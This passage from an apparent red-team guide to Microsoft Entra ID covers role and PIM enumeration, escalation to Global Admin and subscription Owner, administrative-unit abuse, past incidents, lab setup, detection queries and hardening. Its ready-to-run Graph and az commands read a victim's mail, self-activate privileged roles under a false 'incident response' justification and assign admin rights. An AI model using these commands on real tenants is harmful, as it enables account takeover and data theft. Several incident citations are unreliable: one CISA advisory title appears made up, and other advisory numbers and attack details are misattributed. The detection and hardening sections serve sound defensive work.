  "https://graph.microsoft.com/v1.0/users/victim@victorten.example/messages?\$top=10"
```

---

## 6. Azure AD Roles: Enumeration and Escalation

### 6.1 Built-in roles of interest

The full list is at <https://learn.microsoft.com/entra/identity/role-based-access-control/permissions-reference>. The roles most often abused:

| Role | What it can do | Escalation path |
|------|----------------|------------------|
| **Global Administrator** (`62e90394-69f5-4237-9190-012177145e10`) | Everything | → Elevate to Azure subscription Owner |
| **Privileged Role Administrator** (`e8611ab8-c189-469a-8605-bc67d0bc18b4`) | Manage role assignments | → Assign self Global Admin |
| **Application Administrator** (`9b895d92-2cd3-44c7-9d02-a6ac2d5ea5c3`) | Manage apps | → Add credentials to a privileged SP → escalate |
| **Cloud Application Administrator** (`158c047a-c907-4556-b7ef-446552a98488`) | Apps (no proxy) | Same as Application Admin |
| **User Administrator** (`fe930be7-5e62-47db-91af-98c3a49a38b1`) | Manage non-admin users + groups | → Add a new user to a role-eligible group |
| **Intune Administrator** (`3a2c62db-5318-420d-8d74-2affed5b7d6c`) | Manage Intune | → Push a script to any managed device (SYSTEM) |
| **Exchange Administrator** (`29232cdf-9323-42fd-ade2-1d097af3e4de`) | Manage Exchange | → Read any mailbox via eDiscovery |
| **SharePoint Administrator** (`f28a1f50-f6e7-4571-818b-6a12f2af6b6c`) | Manage SharePoint | → Read any site, any file |
| **Authentication Administrator** (`c4e39bd9-1100-46d2-8c2d-bf0117f6186a`) | Reset any non-admin's password | → Reset credentials of privileged users in some configurations |
| **Helpdesk Administrator** (`729827e3-9c14-49f7-bb1b-9608f156bbb8`) | Reset non-admin passwords | Similar to Authentication Admin |
| **Hybrid Identity Administrator** (`8ac3fc64-6eca-42ea-9e69-5f4c8b6525b0`) | Manage AADConnect | → Push a backdoor to on-prem AD via AADConnect |

### 6.2 Enumerate role assignments

```bash
# Enumerate Global Admin assignments
GA_ROLE_TEMPLATE_ID="62e90394-69f5-4237-9190-012177145e10"
az rest --method get \
  --url "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?\$filter=roleDefinitionId eq '${GA_ROLE_TEMPLATE_ID}'&\$expand=principal" \
  | jq '.value[].principal.userPrincipalName'

# Enumerate ALL role assignments
az rest --method get \
  --url "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?\$expand=principal,roleDefinition" \
  | jq '.value | group_by(.roleDefinitionId) | map({role: .[0].roleDefinition.displayName, count: length, members: [.[].principal.userPrincipalName]})'

# Get role definitions (all 110+ built-in roles)
az rest --method get \
  --url "https://graph.microsoft.com/v1.0/roleManagement/directory/roleDefinitions" \
  | jq '.value[] | {id, displayName, description}'
```

### 6.3 PIM (Privileged Identity Management) abuse

PIM lets users be **eligible** for a role without being permanently assigned. They activate when needed, with a time-boxed window (default 4h, configurable). PIM has its own API surface:

```bash
# Enumerate PIM-eligible role assignments
az rest --method get \
  --url "https://graph.microsoft.com/v1.0/roleManagement/directory/roleEligibilityScheduleInstances?\$expand=principal,roleDefinition" \
  | jq '.value[] | {principal: .principal.userPrincipalName, role: .roleDefinition.displayName, startDateTime, endDateTime}'

# Activate a role you're eligible for
az rest --method post \
  --url "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignmentScheduleRequests" \
  --body '{
    "action": "selfActivate",
    "principalId": "REPLACE_WITH_YOUR_PRINCIPAL_ID",
    "roleDefinitionId": "62e90394-69f5-4237-9190-012177145e10",
    "directoryScopeId": "/",
    "justification": "Incident response - service outage",
    "scheduleInfo": {
      "startDateTime": "2026-06-27T12:00:00Z",
      "expiration": {"type": "AfterDuration", "duration": "PT4H"}
    }
  }'
```

**PIM abuse patterns**:

1. **Self-activation**: if a user is PIM-eligible and the policy allows self-activation, they can activate at will (some configurations require approval — but approval is often weak).
2. **Approval bypass**: some PIM policies have multi-approval but check if the approver is the same as the requester (yes, this has been seen in production).
3. **Audit lag**: PIM activations create audit events but may not trigger real-time alerting. An attacker can activate → act fast → deactivate within the alert window.
4. **Make eligible for an attacker**: a Privileged Role Administrator can grant a low-priv user PIM-eligibility for Global Admin — and the eligibility doesn't show in regular role enum (only in PIM enum).

### 6.4 Role assignment via Microsoft Graph

```bash
# Direct role assignment (requires Privileged Role Administrator)
az rest --method post \
  --url "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments" \
  --body '{
    "@odata.type": "#microsoft.graph.unifiedRoleAssignment",
    "roleDefinitionId": "62e90394-69f5-4237-9190-012177145e10",
    "principalId": "REPLACE_WITH_YOUR_PRINCIPAL_ID",
    "directoryScopeId": "/"
  }'
```

### 6.5 Global Admin → Azure subscription Owner (legacy elevation)

Global Admins can elevate to Azure subscription Owner via a one-click "Access management for Azure resources" toggle:

```bash
# Step 1: as Global Admin, elevate
az rest --method post \
  --url "https://management.azure.com/providers/Microsoft.Authorization/elevateAccess?api-version=2016-07-01"

# Step 2: now you have User Access Administrator at root management group
# Assign yourself Owner on the target subscription
az role assignment create \
  --role "Owner" \
  --assignee "victim@corp.com" \
  --scope "/subscriptions/REPLACE_WITH_YOUR_SUBSCRIPTION_ID"
```

This is a documented Microsoft feature; defenders should monitor the `elevateAccess` action.

---

## 7. Administrative Unit Abuse

### 7.1 What AUs are

An Administrative Unit is a container for users, groups, and devices that constrains the scope of an admin role. A User Administrator assigned to an AU can manage only the users in that AU. Designed for delegation (e.g., regional IT admin can reset passwords only for their region's users).

### 7.2 AU reconnaissance

```bash
# List all AUs
az rest --method get \
  --url "https://graph.microsoft.com/v1.0/administrativeUnits?\$select=id,displayName,description"

# List members of an AU
az rest --method get \
  --url "https://graph.microsoft.com/v1.0/administrativeUnits/REPLACE_WITH_YOUR_AU_ID/members"

# List scoped role assignments on an AU
az rest --method get \
  --url "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?\$filter=directoryScopeId eq '/administrativeUnits/REPLACE_WITH_YOUR_AU_ID'&\$expand=principal,roleDefinition"
```

### 7.3 AU lateral movement patterns

- **Identify over-privileged AU-scoped admins**: an AU-scoped User Admin has a finite blast radius, but if the AU contains users who are themselves privileged elsewhere, password reset → lateral.
- **Identify AU membership misconfigurations**: if a "low-sensitivity" AU contains users who are in fact sensitive (e.g., executives), the AU's admin can compromise them.
- **AU scope confusion**: some role assignments are scoped to `/administrativeUnits/<id>` when the admin thought they were scoped to `/`. The visible result: the admin has tenant-wide rights AND AU-scoped rights.

---

## 8. Real Incidents

### 8.1 SolarWinds SUNBURST — Golden SAML backdoor (2020)

**What happened**: The SUNBURST (Solorigate) supply-chain attack compromised the SolarWinds Orion build pipeline. The malware (SUNBURST) was distributed to ~18,000 organizations via tainted Orion updates. A subset of those were targeted for follow-on activity: espionage-grade identity compromise.

**Identity attack chain**:

1. SUNBURST beacon from Orion server.
2. Attacker moves laterally to on-prem AD; eventually reaches AD FS server.
3. **The attacker extracts the AD FS TokenSigning certificate** (and DKM-related key material).
4. With the TokenSigning cert, attacker forges SAML assertions for any user — including MFA-satisfied claims — and presents them to Entra ID (then Azure AD).
5. The forged SAML token is consumed; the attacker reads mail at M365 (Department of Treasury, DHS CISA were among the targeted organizations).

This technique was christened **Golden SAML** by CyberArk in 2017 and weaponized at scale by APT29 (Cozy Bear) in SolarWinds (2020).

**Indicators of compromise**:

- Unexpected SAML assertions in sign-in logs (claims present that don't match the user's normal auth pattern).
- AD FS server sign-in activity anomalies.
- New SAML trust relationships.

**References**:
- CISA + FBI + NSA Joint Advisory AA21-008A "Detecting Post-Compromise Threat Activity in Microsoft Cloud Environments (Cloud Logon)"
- Microsoft's SUNBURST / Solorigate writeup
- CyberArk's original Golden SAML writeup (2017)

### 8.2 Nobelium (Midnight Blizzard) token theft — 2021-2022

**What happened**: After the SolarWinds incident, APT29 (Nobelium / Midnight Blizzard) continued operations using **token theft and replay** rather than SAML forgery. The May 2021 attack against USAID (via Constant Contact) is the canonical example. The attack:

1. Attacker compromised a Constant Contact account used by USAID.
2. Attacker sent phishing emails impersonating USAID. The phishing used a legitimate-looking OAuth consent flow.
3. **The phishing captured OAuth access tokens and refresh tokens**, not passwords.
4. With the stolen tokens, attacker accessed Microsoft 365 mailboxes of targeted organizations.

The technique was dubbed **consent phishing** / illicit consent grant.

**Indicators of compromise**:

- New app consent grants in audit logs (not preceded by user-driven sign-in).
- Refresh token exchange patterns that don't match the user's normal app usage.
- Sign-ins from new IPs with refresh-token-based auth (no MFA challenge).

**References**:
- CISA AA21-148A "Reducing the Risk of Vicious Bear Activities" (Nobelium)
- Microsoft's Nobelium research blog series

### 8.3 Midnight Blizzard M365 account compromise (January 2024)

**What happened**: In November 2023, attackers (attributed to Midnight Blizzard / APT29) compromised a Microsoft corporate tenant. The initial foothold was a **legacy, weak-credentials test tenant account** that did not have MFA enforced. The attackers used this account to access a corporate mailbox, then pivoted via OAuth app abuse:

1. Compromise test account (no MFA, weak password).
2. Use the account to access Microsoft corporate mail.
3. From the mail, learn about senior leadership and security team processes.
4. **Create new OAuth app registrations** (via the compromised account, which had Application Admin rights in some scope) for persistence.
5. Use the apps to maintain access and exfiltrate data over weeks.

The compromise was discovered in January 2024; Microsoft disclosed publicly. Microsoft later published a detailed post-mortem. The key lessons:

- Test / "throwaway" corporate accounts **must** have the same MFA and CA policies as production accounts.
- App registration self-service should be restricted.
- New app creation should be a high-severity alert.
- Continuous monitoring of sign-ins from corporate accounts against test/legacy auth patterns.

**References**:
- Microsoft MSTIC blog "Midnight Blizzard guidance for enterprise"
- CISA joint cybersecurity advisory (with FBI, NSA, etc.) on Midnight Blizzard
- Mandiant analysis of the attack

### 8.4 Other notable incidents

- **LAPSUS$ Okta and Microsoft compromises (2022)**: LAPSUS$ (a teenager-led group) used MFA fatigue and social engineering to compromise Okta, Microsoft, Samsung, NVIDIA, Cisco, and Uber. Their playbook: target helpdesk / privileged users, push-bomb MFA, capture session cookies. CISA Advisory AA22-040A is the canonical reference.
- **Citrix Bleed (CVE-2023-4966) + identity pivot (Oct 2023)**: Citrix NetScaler session hijack → identity compromise at multiple Fortune 500 firms.
- **23andMe credential stuffing (Oct 2023)**: Though not directly an Entra ID incident, it cascaded into identity incidents at Okta (see Okta guide).

---

## 9. Lab Setup

### 9.1 Free Microsoft 365 Developer Program tenant (best option as of 2026)

Microsoft 365 Developer Program provides a free E5 license tenant for development/testing. As of late 2024, Microsoft restricted the program to verified developers, but it remains the canonical lab for Entra ID testing.

```
Steps:
1. Visit https://developer.microsoft.com/microsoft-365/dev-program
2. Sign in with any Microsoft account (personal is fine).
3. Fill in the developer intent form (you may need to describe your use case).
4. Receive a tenant: REPLACE_WITH_YOUR_TENANT_NAME.onmicrosoft.com
5. The tenant comes with:
   - 25 E5 licenses (Microsoft 365 E5)
   - Azure AD P2 licenses (PIM is testable)
   - Conditional Access (Core license)
   - Microsoft Defender for Cloud Apps
   - Exchange Online, SharePoint, Teams, etc.
6. License is renewed automatically as long as there's development activity.
```

### 9.2 Free Microsoft Entra ID P2 tenant (Azure free tier)

```
1. Sign up for an Azure free account (https://azure.microsoft.com/free/)
2. Create a new Entra ID tenant in the Azure portal
3. Add a free P2 trial (60 days) for Conditional Access + PIM testing
4. License: 1 free tenant, then P2 trial
```

### 9.3 AADConnect hybrid lab

For testing PHS / PTA / Federation attack paths:

```
Hardware: 1 hypervisor (Hyper-V, VMware, or KVM) capable of 3 VMs
VMs:
  - dc01.corp.local (Windows Server 2022, AD DS, DNS)
  - aadconnect.corp.local (Windows Server 2022, AADConnect)
  - win10-01.corp.local (Windows 10/11, hybrid joined)

Steps:
1. Install Windows Server on dc01, promote to DC, create corp.local forest
2. Sign up for M365 Developer tenant (per §9.1)
3. Add corp.com as a custom domain in Entra ID (verify via DNS TXT)
4. Install AADConnect on aadconnect.corp.local, configure PHS or PTA
5. Verify sync: users in corp.local\Users appear in Entra ID tenant
6. For Federation lab: install AD FS role on a separate VM, configure federation in Entra ID

This lab lets you test:
- PHS attacks (extract MSOL_ account, DCSync)
- PTA attacks (intercept agent, backdoor agent)
- Federation attacks (extract TokenSigning cert, forge SAML)
- Hybrid device join (PRT extraction from win10-01)
```

### 9.4 B2B guest scenario lab

For testing guest user persistence:

```
1. Create two M365 Developer tenants: tenant-a.onmicrosoft.com, tenant-b.onmicrosoft.com
2. In tenant-a: create a guest invitation for an external user from tenant-b
3. In tenant-b: accept the invitation
4. The guest user (tenant-b) now has a UPN in tenant-a:
   external_user_tenant-b.onmicrosoft.com#EXT#@tenant-a.onmicrosoft.com
5. Test: in tenant-a, add the guest to a privileged group, observe group-based role assignment
6. Test: in tenant-a, remove the guest, verify the guest loses all access
```

### 9.5 Recon toolkit installation (your attacking host)

```bash
# Install Azure CLI
brew install azure-cli  # macOS
# Or: curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash  # Debian/Ubuntu

# Install Microsoft Graph PowerShell SDK
Install-Module -Name Microsoft.Graph -Scope CurrentUser

# Install AADInternals
Install-Module -Name AADInternals -Scope CurrentUser

# Install ROADtools
python3 -m pip install roadlib roadrecon roadtx

# Install MicroBurst
git clone https://github.com/NetSPI/MicroBurst.git /opt/MicroBurst
Import-Module /opt/MicroBurst/MicroBurst.psm1

# Install MFASweep
git clone https://github.com/dafthack/MFASweep.git /opt/MFASweep

# Install TokenTactics (V2 is the maintained version)
git clone https://github.com/felamos/TokenTacticsV2.git /opt/TokenTacticsV2
cd /opt/TokenTacticsV2 && pip install -r requirements.txt

# Install GraphRunner
git clone https://github.com/dafthack/GraphRunner.git /opt/GraphRunner
cd /opt/GraphRunner && pip3 install -r requirements.txt

# Install AzureHound
# Download the latest binary from https://github.com/BloodHoundAD/AzureHound/releases
sudo mv azurehound /usr/local/bin/
sudo chmod +x /usr/local/bin/azurehound

# Verify everything
az version
az ad signed-in-user show  # should prompt for login
python3 -c "import roadrecon"  # should succeed
```

---

## 10. Detection & Hardening

### 10.1 Defender detection signals

| Signal | Source | What it catches |
|--------|--------|------------------|
| **New app consent** | Entra ID audit log | Illicit consent grant, backdoor app |
| **New app registration** | Entra ID audit log | Backdoor app creation |
| **Refresh token exchange** for unfamiliar client_id | Entra ID sign-in log | Token replay across apps |
| **PIM activation** | Entra ID audit log | Privilege escalation |
| **Federation trust change** | Entra ID audit log | Federation backdoor |
| **Sign-in from new country** | Entra ID Identity Protection | Token replay from foreign infrastructure |
| **Impossible travel** | Defender for Cloud Apps | Token replay from distant IPs |
| **Legacy auth sign-in** | Entra ID sign-in log (ClientAppType) | Legacy auth bypass |
| **Service principal sign-in** | Entra ID sign-in log | SP-based access (often unmonitored) |
| **HARD sign-in volume from one IP** | Entra ID sign-in log | Password spray |
| **MFA denial pattern (>5 in 5 min)** | Entra ID sign-in log | MFA fatigue |
| **Mass app role assignment** | Entra ID audit log | Privilege escalation via Graph |
| **Microsoft Admin Management excluded from CA** | CA policy diff | Break-glass account abuse |

### 10.2 Microsoft Sentinel / SIEM KQL queries

```kql
// Detect new app consent grants (potential illicit consent)
AuditLogs
| where ActivityDisplayName == "Consent to application"
| extend appId = tostring(InitiatedBy.user.id)
| extend targetApp = tostring(TargetResources[0].displayName)
| extend targetScopes = tostring(TargetResources[0].modifiedProperties)
| project TimeGenerated, appDisplayName=targetApp, scopes=targetScopes, initiatedBy=appId
| order by TimeGenerated desc

// Detect refresh token replay across apps (same user, multiple client_ids in short window)
SignInLogs
| where ClientAppType == "Mobile Apps and Desktop Clients"
| where AuthenticationProcessingDetails has "refreshToken"
| summarize distinctClientApps = makeset(AppDisplayName) by UserPrincipalName, bin(TimeGenerated, 1h)
| where array_length(distinctClientApps) > 5
| project UserPrincipalName, distinctClientApps, TimeGenerated

// Detect MFA fatigue (many denials in short window)
SignInLogs
| where ResultType == "500121"  // MFA failed
| summarize denialCount = count() by UserPrincipalName, bin(TimeGenerated, 5m)
| where denialCount > 5
| project UserPrincipalName, denialCount, TimeGenerated

// Detect new federation trust changes
AuditLogs
| where ActivityDisplayName in ("Set domain authentication", "Add federation trust")
| project TimeGenerated, ActivityDisplayName, InitiatedBy, TargetResources

// Detect PIM activations
AuditLogs
| where ActivityDisplayName == "Add member to role in PIM completed (PIM activation)"
| project TimeGenerated, TargetResources, InitiatedBy
```

### 10.3 Hardening checklist (priority order)

1. **Block legacy auth** — CA policy "Block legacy authentication", state=enabled. Verify no per-user overrides.
2. **MFA for all users** — CA policy: All users, All cloud apps, Require MFA. No exclusions except break-glass accounts.
3. **Phishing-resistant MFA for admins** — CA policy: All admin roles, Require authentication strength = FIDO2 / Windows Hello.
4. **PIM for every privileged role** — Convert permanent role assignments to PIM-eligible. Maximum activation 4h. Require approval + MFA + audit.
5. **Continuous Access Evaluation (CAE)** — Enable for all CAE-aware apps (Graph, Outlook, SharePoint, Teams, Azure).
6. **Identity Protection** — User risk policy: high-risk users blocked. Sign-in risk policy: high-risk sign-ins blocked.
7. **Block self-service app registration** — Enterprise Applications → User settings → Users can register applications = No.
8. **Require admin consent for high-priv scopes** — User consent policy: only `User.Read` and similar low-priv scopes can be user-consented. `Mail.Read`, `Files.ReadWrite`, `Application.ReadWrite.All` require admin consent.
9. **Quarterly app consent review** — Review every OAuth2PermissionGrant. Revoke unknown apps.
10. **Federation hygiene** — AD FS TokenSigning cert rotation 1-2 years (not 5-10). HSM-backed keys where possible.
11. **Service principal least privilege** — No `Application.ReadWrite.All` for production apps. Audit appRole assignments quarterly.
12. **Break-glass account protection** — Two break-glass accounts, MFA on hardware tokens, nof regular usage, alerts on their sign-in.
13. **Audit log to SIEM** — 1+ year retention. Pipe Entra ID audit + sign-in logs to Sentinel / Splunk / Elastic.
14. **Identity Secure Score target = 80+** — Implement the priority controls Microsoft Identity Secure Score recommends.

### 10.4 Specific post-incident hardening

After Midnight Blizzard (Jan 2024), Microsoft recommended:

- Audit all test / legacy / "throwaway" accounts for MFA enforcement gaps.
- Block all authentication flows that don't satisfy modern CA.
- Enforce tenant-wide audit retention beyond 30 days.
- Configure conditional access policy alerts (preview feature in some SKUs).
- Restrict application registration to a specific admin group, not self-service.

---

## 11. References

### 11.1 Vendor documentation

- Microsoft Identity documentation: <https://learn.microsoft.com/entra>
- Microsoft Entra ID security operations guide: <https://learn.microsoft.com/entra/architecture/security-operations-introduction>
- Microsoft Entra built-in roles: <https://learn.microsoft.com/entra/identity/role-based-access-control/permissions-reference>
- Conditional Access documentation: <https://learn.microsoft.com/entra/identity/conditional-access/>
- Microsoft Identity Platform OAuth flows: <https://learn.microsoft.com/entra/identity-platform/v2-oauth2-auth-code-flow>

### 11.2 Protocols (RFCs and standards)

- OAuth 2.0 RFC 6749: <https://datatracker.ietf.org/doc/html/rfc6749>
- OAuth 2.0 Token Exchange RFC 8693: <https://datatracker.ietf.org/doc/html/rfc8693>
- OpenID Connect Core 1.0: <https://openid.net/specs/openid-connect-core-1_0.html>
- OpenID Connect Discovery 1.0: <https://openid.net/specs/openid-connect-discovery-1_0.html>
- JWT (RFC 7519): <https://datatracker.ietf.org/doc/html/rfc7519>
- SAML 2.0 Core: <https://docs.oasis-open.org/security/saml/v2.0/saml-core-2.0-os.pdf>

### 11.3 Incident references

- CISA AA21-008A (SolarWinds / Golden SAML): <https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-008a>
- CISA AA22-040A (LAPSUS$ MFA fatigue): <https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-040a>
- CISA AA21-148A (Nobelium): <https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-148a>
- Microsoft MSTIC Midnight Blizzard corporate account compromise (Jan 2024): <https://www.microsoft.com/en-us/security/blog/>
- Mandiant SUNBURST analysis: <https://www.mandiant.com/resources/sunburst-additional-technical-details>
- CyberArk "Golden SAML" original research (2017): <https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps>

### 11.4 Tools

- ROADtools: <https://github.com/dirkjanm/ROADtools>
- AADInternals: <https://github.com/Gerenios/AADInternals>
- MicroBurst: <https://github.com/NetSPI/MicroBurst>
- AzureHound: <https://github.com/BloodHoundAD/AzureHound>
- MFASweep: <https://github.com/dafthack/MFASweep>
- TokenTacticsV2: <https://github.com/felamos/TokenTacticsV2>
- GraphRunner: <https://github.com/dafthack/GraphRunner>
- Mandiant ADFSDump-LL: <https://github.com/mandiant/ADFSDump-LL>

### 11.5 Research blogs

- Dirk-jan Mollema (@_dirkjan): <https://dirkjanm.io> — the canonical Azure AD attack research blog
- Nestori Syynimaa (@DrAzureAD): <https://o365blog.com> — AADInternals author, posts on AAD attack research
- Microsoft MSTIC: <https://www.microsoft.com/en-us/security/blog>
- Mandiant: <https://www.mandiant.com/resources/blog>
- Secureworks: <https://www.secureworks.com/blog>
- TrustedSec: <https://www.trustedsec.com/blog>
